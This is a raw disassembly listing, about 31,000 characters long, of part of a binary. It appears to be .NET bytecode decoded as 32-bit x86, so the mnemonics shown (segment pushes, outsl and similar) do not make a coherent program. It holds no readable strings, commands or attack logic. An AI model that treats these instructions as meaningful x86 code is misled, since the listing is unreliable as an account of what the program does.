  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 cc       	add    $0xcc720511,%eax
  4031ba:	23 00                	and    (%eax),%eax
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 d4 23       	and    $0x23d47216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 3e    	or     0x3e721825(%edx),%ah
  4031e4:	24 00                	and    $0x0,%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 50    	or     0x50721a25(%edx),%ah
  4031f5:	24 00                	and    $0x0,%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 64             	or     0x64(%edx),%dh
  403227:	24 00                	and    $0x0,%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 c2             	or     -0x3e(%edx),%dh
  403246:	24 00                	and    $0x0,%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 c2             	or     -0x3e(%edx),%dh
  403251:	24 00                	and    $0x0,%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 c6                	jb     0x403289
  4032c3:	24 00                	and    $0x0,%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 d0             	or     %esi,-0x30(%edx)
  4032da:	24 00                	and    $0x0,%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 e4                	jb     0x4032ca
  4032e6:	24 00                	and    $0x0,%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 04                	jb     0x4032f6
  4032f2:	25 00 70 06 6f       	and    $0x6f067000,%eax
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 c2             	or     -0x3e(%edx),%dh
  4032fd:	24 00                	and    $0x0,%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 1a                	jb     0x403328
  40330e:	25 00 70 28 72       	and    $0x72287000,%eax
  403313:	00 00                	add    %al,(%eax)
  403315:	0a 28                	or     (%eax),%ch
  403317:	6f                   	outsl  %ds:(%esi),(%dx)
  403318:	00 00                	add    %al,(%eax)
  40331a:	0a 6f 71             	or     0x71(%edi),%ch
  40331d:	00 00                	add    %al,(%eax)
  40331f:	0a 11                	or     (%ecx),%dl
  403321:	09 72 22             	or     %esi,0x22(%edx)
  403324:	25 00 70 11 08       	and    $0x8117000,%eax
  403329:	28 73 00             	sub    %dh,0x0(%ebx)
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 2e                	jb     0x40335e
  403330:	25 00 70 28 68       	and    $0x68287000,%eax
  403335:	00 00                	add    %al,(%eax)
  403337:	0a 6f 71             	or     0x71(%edi),%ch
  40333a:	00 00                	add    %al,(%eax)
  40333c:	0a dd                	or     %ch,%bl
  40333e:	0f 00 00             	sldt   (%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 3e                	jb     0x4034ab
  40346d:	25 00 70 6f 7e       	and    $0x7e6f7000,%eax
  403472:	00 00                	add    %al,(%eax)
  403474:	0a 39                	or     (%ecx),%bh
  403476:	07                   	pop    %es
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 44             	adc    %esi,0x44(%edx)
  4034ae:	25 00 70 73 7f       	and    $0x7f737000,%eax
  4034b3:	00 00                	add    %al,(%eax)
  4034b5:	0a 0a                	or     (%edx),%cl
  4034b7:	06                   	push   %es
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 8a 25    	or     0x258a7209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4034ec:	25 00 70 28 25       	and    $0x25287000,%eax
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	0a 39                	or     (%ecx),%bh
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 d0             	or     %esi,-0x30(%edx)
  4034fc:	25 00 70 6f 83       	and    $0x836f7000,%eax
  403501:	00 00                	add    %al,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 dc             	or     -0x24(%edx),%dh
  403510:	25 00 70 6f 7e       	and    $0x7e6f7000,%eax
  403515:	00 00                	add    %al,(%eax)
  403517:	0a 3a                	or     (%edx),%bh
  403519:	30 00                	xor    %al,(%eax)
  40351b:	00 00                	add    %al,(%eax)
  40351d:	11 04 72             	adc    %eax,(%edx,%esi,2)
  403520:	ec                   	in     (%dx),%al
  403521:	25 00 70 6f 7e       	and    $0x7e6f7000,%eax
  403526:	00 00                	add    %al,(%eax)
  403528:	0a 3a                	or     (%edx),%bh
  40352a:	1f                   	pop    %ds
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 d0                	jb     0x403501
  403531:	25 00 70 6f 83       	and    $0x836f7000,%eax
  403536:	00 00                	add    %al,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 fa             	or     -0x6(%edx),%dh
  403540:	25 00 70 28 25       	and    $0x25287000,%eax
  403545:	00 00                	add    %al,(%eax)
  403547:	0a 39                	or     (%ecx),%bh
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 10             	adc    %esi,0x10(%edx)
  40362e:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
